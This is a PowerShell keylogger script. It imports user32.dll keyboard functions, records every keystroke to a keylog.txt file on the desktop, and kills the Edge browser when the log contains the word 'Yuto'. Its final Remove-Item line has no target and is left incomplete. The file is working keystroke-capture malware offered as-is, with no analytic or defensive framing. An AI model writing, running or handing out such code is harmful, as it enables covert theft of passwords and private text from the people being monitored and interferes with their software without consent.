$Desktop_Path = [Environment]::GetFolderPath("Desktop")

$Keylog_Path = "$Desktop_Path\keylog.txt"
 
if ((Test-Path $Keylog_Path) -eq $False) { New-Item $Keylog_Path } 

# user 32 dll file contains Windows APIs:

$Signatures = @' 
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

try {
        
    while ((Test-Path $Keylog_Path) -ne $false) {

        Start-Sleep -Milliseconds 40
            
        for ($ascii = 9; $ascii -le 254; $ascii++) {
                
            $state = $API::GetAsyncKeyState($ascii)
                
            if ($state -eq -32767) {
                $null = [console]::CapsLock
                    
                $virtualKey = $API::MapVirtualKey($ascii, 3)

                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256

                $checkkbstate = $API::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName System.Text.StringBuilder
                    
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($success -and (Test-Path $Keylog_Path) -eq $true) {
                       
                    [System.IO.File]::AppendAllText($Keylog_Path, $mychar, [System.Text.Encoding]::Unicode)

                    $Keylogger_Contents = Get-Content -Path $Keylog_Path

                    if ($Keylogger_Contents | Select-String -Pattern "Yuto") {

                        Write-Host "Word is in keylogger." -ForegroundColor Red
                        Stop-Process -Name "msedge"
                        Remove-Item 
                    }

                }
            }
        }
    }
} 
finally { exit }
